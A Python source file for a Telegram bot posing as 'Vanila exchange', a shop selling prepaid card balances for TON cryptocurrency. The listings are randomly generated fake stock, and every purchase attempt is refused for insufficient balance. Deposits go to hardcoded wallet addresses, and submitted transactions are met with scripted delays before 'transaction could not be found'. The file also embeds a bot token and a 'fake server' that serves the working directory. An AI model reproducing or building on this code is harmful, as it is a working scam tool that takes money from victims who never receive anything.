import logging
import datetime
import random
import sqlite3
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- Logging Setup ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Configuration ---
BOT_TOKEN = "8312816041:AAEVEH0u7PL-MELnS3M0KhMGn84y-NBchvY"

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

# --- Database Initialization ---
def init_db():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id INTEGER PRIMARY KEY, first_name TEXT, balance REAL DEFAULT 0.0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS cards 
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT, amount REAL, currency TEXT, sticker TEXT, status TEXT DEFAULT 'available')''')
    conn.commit()
    conn.close()

def generate_daily_cards():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM cards")
    
    all_bins = [
        ('533985xx', 'CAD', '🅶'), ('461126xx', 'CAD', ''),
        ('373778xx', 'AUD', ''), ('377935xx', 'AUD', ''), ('375163xx', 'AUD', ''),
        ('435880xx', 'USD', ''), ('491277xx', 'USD', ''), ('511332xx', 'USD', '🔄'),
        ('428313xx', 'USD', ''), ('520356xx', 'USD', ''), ('409758xx', 'USD', ''),
        ('525362xx', 'USD', ''), ('451129xx', 'USD', ''), ('434340xx', 'USD', ''),
        ('426370xx', 'USD', ''), ('411810xx', 'USD', ''), ('403446xx', 'USD', ''),
        ('533621xx', 'USD', ''), ('446317xx', 'USD', ''), ('457824xx', 'USD', ''),
        ('545660xx', 'USD', ''), ('432465xx', 'USD', '🔄'), ('516612xx', 'USD', ''),
        ('484718xx', 'USD', ''), ('485246xx', 'USD', ''), ('402372xx', 'USD', ''),
        ('457851xx', 'USD', '')
    ]

    cards = []
    total_to_generate = random.randint(250, 300)
    for _ in range(total_to_generate):
        selected = random.choice(all_bins)
        bin_val, curr, stick = selected
        if curr == 'CAD': amt = round(random.uniform(10, 100), 2)
        elif curr == 'AUD': amt = round(random.uniform(10, 150), 2)
        else: amt = round(random.choice([random.uniform(5, 50), random.uniform(50, 500)]), 2)
        cards.append((bin_val, amt, curr, stick))

    cursor.executemany("INSERT INTO cards (bin, amount, currency, sticker) VALUES (?, ?, ?, ?)", cards)
    conn.commit()
    conn.close()

# --- Bot Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (f"⚡️ Welcome {user.first_name} to Vanila exchange! ⚡️\n"
            "Sell, Buy, and strike deals in seconds!!\n"
            "Current rate is 37%")
    kb = [[InlineKeyboardButton("💳 Stock", callback_data="page_1")],
          [InlineKeyboardButton("💰 Deposit", callback_data="deposit")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def show_stock(update: Update, context: ContextTypes.DEFAULT_TYPE, page=1):
    query = update.callback_query
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM cards WHERE status='available' ORDER BY amount DESC")
    all_cards = cursor.fetchall()
    conn.close()

    if not all_cards:
        await query.edit_message_text("No cards in stock!")
        return

    per_page = 10
    total_pages = (len(all_cards) + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start_idx = (page - 1) * per_page
    page_cards = all_cards[start_idx : start_idx + per_page]

    res = f"⚡️ VANILA Exchange - Main Listings ⚡️\n\n"
    buttons = []
    for i, card in enumerate(page_cards, start=start_idx+1):
        res += f"{i}. `{card[1]}` {card[3]}${card[2]} at 37% {card[4]}\n"
        buttons.append([InlineKeyboardButton(f"🛒 Buy {card[1]}", callback_data="buy_insufficient")])

    nav = [InlineKeyboardButton("⬅️Back", callback_data=f"page_{page-1}"),
           InlineKeyboardButton(f"{page}/{total_pages}", callback_data="none"),
           InlineKeyboardButton("Next➡️", callback_data=f"page_{page+1}")]
    
    footer = [InlineKeyboardButton("💰 Deposit", callback_data="deposit"), 
              InlineKeyboardButton("Refresh🔂", callback_data=f"page_{page}")]

    await query.edit_message_text(res, reply_markup=InlineKeyboardMarkup(buttons + [nav] + [footer]), parse_mode="Markdown")

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    if data.startswith("page_"):
        await show_stock(update, context, page=int(data.split("_")[1]))
    
    elif data == "deposit":
        addr = random.choice(DEPOSIT_ADDRESSES)
        context.user_data['active_addr'] = addr
        text = (f"⚡ VANILA Exchange — TON DEPOSIT ⚡\n\n"
                f"Deposit Information: `{addr}`\n\n"
                f"Minimum Deposit: `15` TON\n"
                f"Instructions:\n1. Send TON to the address above.\n2. Wait for 1 confirmation.\n"
                f"3. Balance updates automatically. ✅\n\n"
                f"⚠️ Note: Session active for 30 minutes.")
        kb = [[InlineKeyboardButton("Confirm ✅", callback_data="dep_confirm"),
               InlineKeyboardButton("Cancel ⛔", callback_data="dep_cancel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "dep_confirm":
        context.user_data['state'] = 'waiting_amount'
        await query.message.reply_text("Please enter the amount.......")

    elif data == "dep_cancel":
        await query.message.delete()
        await query.message.reply_text("Deposit request has been canceled.❌\nYou can now create a new deposit request.✅")
    
    elif data == "buy_insufficient":
        await query.answer("Insufficient balance! Please deposit TON first.", show_alert=True)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    text = update.message.text

    if state == 'waiting_amount':
        if text.isdigit() and int(text) >= 15:
            context.user_data['amt'] = text
            context.user_data['state'] = 'waiting_txid'
            await update.message.reply_text("Submit withdraw Txid :")
        else:
            await update.message.reply_text("Minimum deposit is 15 TON. Please enter 15 or more.")

    elif state == 'waiting_txid':
        txid = text
        amt = context.user_data.get('amt')
        addr = context.user_data.get('active_addr')
        order_no = random.randint(20991, 1000059)
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        context.user_data['state'] = None

        res = (f"NAME : `{update.effective_user.first_name}`\n"
               f"Address : `{addr}`\n"
               f"AMOUNT : `{amt}`\n"
               f"Txid : `{txid}`\n"
               f"Order Number : `{order_no}`\n"
               f"Stats : `Waiting...`\n"
               f"TIME : `{time_str}`")
        msg = await update.message.reply_text(res, parse_mode="Markdown")

        await asyncio.sleep(50)
        res = res.replace("`Waiting...`", "`Processing....`")
        await msg.edit_text(res, parse_mode="Markdown")

        await asyncio.sleep(55)
        res = res.replace("`Processing....`", "`transaction could not be found.`")
        await msg.edit_text(res, parse_mode="Markdown")

# --- Main App ---
def main():
    init_db()
    generate_daily_cards()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Fake Server for Render Port
    import threading, http.server
    def run_fake():
        port = int(os.environ.get("PORT", 8080))
        http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler).serve_forever()
    threading.Thread(target=run_fake, daemon=True).start()

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
